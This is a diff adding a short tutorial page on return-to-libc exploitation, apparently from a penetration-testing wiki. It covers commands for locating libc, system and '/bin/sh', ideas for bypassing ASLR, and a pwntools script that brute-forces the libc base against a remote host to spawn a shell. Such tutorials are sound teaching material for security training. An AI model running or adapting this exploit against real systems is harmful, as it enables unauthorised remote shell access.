@@ -1,0 +1,76 @@
+# Ret2Lib
+
+**If you have found a vulnerable binary and you think that you can exploit it using Ret2Lib here you can find some basic steps that you can follow.**
+
+## If you are **inside** the **host** 
+
+### You can find the **address of lib**c
+
+```bash
+ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
+```
+
+If you want to check if the ASLR is changing the address of libc you can do:
+
+```bash
+for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
+```
+
+### Get offset of system function
+
+```bash
+readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+```
+
+### Get offset of "/bin/sh"
+
+```bash
+strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+```
+
+### /proc/&lt;PID&gt;/maps
+
+If the process is creating **children** every time you talk with it \(network server\) try to **read** that file \(probably you will need to be root\).
+
+Here you can find **exactly where is the libc loaded** inside the process and **where is going to be loaded** for every children of the process.
+
+![](../../.gitbook/assets/image%20%2899%29.png)
+
+In this case it is loaded in **0xb75dc000** \(This will be the base address of libc\)
+
+### Using dgp-peda
+
+Get address of **system** function, of **exit** function and of the string **"/bin/sh"** using gdb-peda:
+
+```text
+p system
+p exit
+find "/bin/sh"
+```
+
+## Bypassing ASLR
+
+You can try to bruteforce the abse address of libc.
+
+```python
+for off in range(0xb7000000, 0xb8000000, 0x1000):  
+```
+
+## Code
+
+```text
+from pwn import *
+
+c = remote('192.168.85.181',20002)
+c.recvline()    #Banner
+
+for off in range(0xb7000000, 0xb8000000, 0x1000):
+    p = ""
+    p += p32(off + 0x0003cb20) #system
+    p += "CCCC" #GARBAGE
+    p += p32(off + 0x001388da) #/bin/sh
+    payload = 'A'*0x20010 + p
+    c.send(payload)
+    c.interactive() #?
+```
+
